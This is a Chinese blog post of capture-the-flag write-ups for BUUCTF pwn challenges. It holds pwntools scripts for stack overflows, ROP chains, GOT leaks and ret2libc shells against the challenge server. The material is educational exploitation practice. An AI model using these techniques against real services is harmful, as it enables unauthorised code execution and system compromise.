<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    buuctf |
    
    summerN&#39;s blog</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
</head>

<body>
<main class="content">
  <section class="outer">
  

<article id="post-buuctf" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      buuctf
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/01/31/buuctf/" class="article-date">
  <time datetime="2020-01-31T13:16:38.324Z" itemprop="datePublished">2020-01-31</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h1 id="buuctf-pwn"><a href="#buuctf-pwn" class="headerlink" title="buuctf pwn"></a>buuctf pwn</h1><a id="more"></a>

<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>nc 出结果</p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>简单的栈溢出</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn1")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28852</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please input"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0xf</span> + <span class="number">8</span>)+ p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是出现了问题，无法在远程无法打通参考文章</p>
<p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p>
<p>我们这里选择转移栈地址</p>
<p>由于text段中有call system 所以我们有两种exp的写法</p>
<p>现在在我看来这两个exp的主要区别在于</p>
<p>payload += p64(0x0000000000401191)</p>
<p>这一串payload</p>
<p>在第2个payload中，如果去掉上面那个，本地可以打通，但是远程无法打通，应该是因为堆栈没有对齐</p>
<p>但是我们加入了上面那一串后，那一串的地址为一个没有参数的函数，所以我们把system的地址放入了其返回地址处，如果有参数的话我们放入的system地址变为了参数，就无法调用system，暂时这样里理解</p>
<p><a href="https://www.jianshu.com/p/4928e726a43f" target="_blank" rel="noopener">https://www.jianshu.com/p/4928e726a43f</a></p>
<p>1</p>
<p>这里我们使用的是text中的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28852'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0x0000000000401191</span>)</span><br><span class="line"><span class="comment">#payload += p64(elf.symbols["system"])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>2</p>
<p>这里使用的是elf.symbols获取的system地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28852'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0x0000000000401016</span>)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"system"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3 warmup_csaw_2016"></a>3 warmup_csaw_2016</h2><p>sprintf()函数泄露了危险函数地址</p>
<p>简单的栈溢出漏洞</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">"node3.buuoj.cn"</span></span><br><span class="line">port = <span class="string">"26985"</span></span><br><span class="line">file_name = <span class="string">"./1"</span></span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"WOW:"</span>)</span><br><span class="line"><span class="comment">#print p.recvline()[0:-1].ljust(8,"\x00")</span></span><br><span class="line"><span class="comment">#print p.recvline()[0:-1]</span></span><br><span class="line"></span><br><span class="line">sys_add = int(p.recvline()[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> sys_add</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(sys_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/yishizuofei/article/details/78195255" target="_blank" rel="noopener">https://blog.csdn.net/yishizuofei/article/details/78195255</a><br>sprintf函数</p>
<h2 id="4-pwn1-sctf-2016"><a href="#4-pwn1-sctf-2016" class="headerlink" title="4.pwn1_sctf_2016"></a>4.pwn1_sctf_2016</h2><p><a href="https://www.runoob.com/cprogramming/c-function-fgets.html" target="_blank" rel="noopener">https://www.runoob.com/cprogramming/c-function-fgets.html</a></p>
<p>fget()函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27432'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">backdoor = <span class="number">0x08048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"I"</span> * <span class="number">0x14</span> + <span class="string">"a"</span> * <span class="number">4</span> + p32(backdoor)</span><br><span class="line"><span class="comment">#p.recvuntil("Tell me something about yourself: ")</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<p>貌似p.recvuntil()无法接受到print打印的数据，，貌似</p>
<h2 id="5-iscn-2019-c-1"><a href="#5-iscn-2019-c-1" class="headerlink" title="5 iscn_2019_c_1"></a>5 iscn_2019_c_1</h2><p>这个题的大致思路就是通过栈溢出漏洞将某个函数的got地址通过puts函数泄露出来从而获取libc的版本</p>
<p>获取libc版本后搜索system或者execve的地址与bin/sh从而获取shell</p>
<p>附上libcsearch的github</p>
<p><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
<p>exp:</p>
<p>先膜拜大佬pumpink9的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./ciscn_2019_c_1'</span></span><br><span class="line">libc_name = <span class="string">'../libc/18-libc64.so'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'25405'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">	p = process(file_name)</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,int(port))</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"../libc/18-libc64.so"</span>)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">main = <span class="number">0x000000000400B28</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x50</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(rdi_ret)+p64(elf.got[<span class="string">'__libc_start_main'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">"encrypted\n"</span>,(payload))</span><br><span class="line">p.recvuntil(<span class="string">"@\n"</span>)</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">ls(<span class="string">"libc start main"</span>,addr)</span><br><span class="line">libc.address = addr-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x58</span></span><br><span class="line">payload +=  p64(rdi_ret)+p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">"choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"encrypted\n"</span>,(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>之后在上我本地能打通，远程打不通的exp（估计是因为libc不行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28653'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"><span class="comment">#p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400790</span></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> put_got</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice!'</span>,<span class="string">"1"</span>)</span><br><span class="line">payload1 = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(start)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"@\n"</span>)</span><br><span class="line">add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="comment">#print add</span></span><br><span class="line"><span class="comment">#print p.recvall()</span></span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,hex(add))</span><br><span class="line">libc_add = add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line"><span class="keyword">print</span> libc_add</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Input your choice!"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="6-HarekazeCTF2019-baby-rop2"><a href="#6-HarekazeCTF2019-baby-rop2" class="headerlink" title="6.[HarekazeCTF2019]baby_rop2"></a>6.[HarekazeCTF2019]baby_rop2</h2><p>有点小难受，第一次用printf泄露</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'29757'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#print_plt = elf.got['printf']</span></span><br><span class="line">printf_plt = <span class="number">0x4004f0</span></span><br><span class="line"><span class="comment">#print hex(print_plt)</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span>) + <span class="string">"a"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">read_add = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_add)</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,int(read_add))</span><br><span class="line">base_add = read_add - libc.dump(<span class="string">"read"</span>)</span><br><span class="line">sys_add = base_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh = base_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print str_bin_sh</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * (<span class="number">0x20</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(str_bin_sh) + p64(sys_add) + p64(main)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="7-get-started-3dsctf-2016"><a href="#7-get-started-3dsctf-2016" class="headerlink" title="7.get_started_3dsctf_2016"></a>7.get_started_3dsctf_2016</h2><p>啥也不会，，涉及到内存修改的问题</p>
<h3 id="第一个本地能打通的思路-远程打不了"><a href="#第一个本地能打通的思路-远程打不了" class="headerlink" title="第一个本地能打通的思路(远程打不了)"></a>第一个本地能打通的思路(远程打不了)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">修改eip跳转到get_flag函即可,可是直接进行跳转到该函数,会存在一个过滤,把该地址给过滤掉了,其实往后退几个指令就行</span><br><span class="line">在buuctf里远程打不了.</span><br><span class="line"></span><br><span class="line">外国大牛博客:http://www.infohelp.org</span><br><span class="line">下面是本地能打的exp,(前提是你自己创建了一个flag.txt文件)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">printf_addr = <span class="number">0x0804F0E0</span></span><br><span class="line">main = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * <span class="number">56</span> + p32(get_flag)</span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="第二个思路-该方法能打远程"><a href="#第二个思路-该方法能打远程" class="headerlink" title="第二个思路:(该方法能打远程)"></a>第二个思路:(该方法能打远程)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.</span><br><span class="line">首先按先说一下mprotect函数:原型如下</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存启始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br><span class="line">要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或</span><br><span class="line">$ .&#x2F; get_started_3dsctf_2016 &amp;</span><br><span class="line">$ cat &#x2F;proc&#x2F;[you_pid]&#x2F;maps 查看内存区域</span><br><span class="line">可以查看到,内存可读可写的地址为: 0x80EB000 ,所以我们对该内存进行增加一个权限</span><br></pre></td></tr></table></figure>

<p>exp:</p>
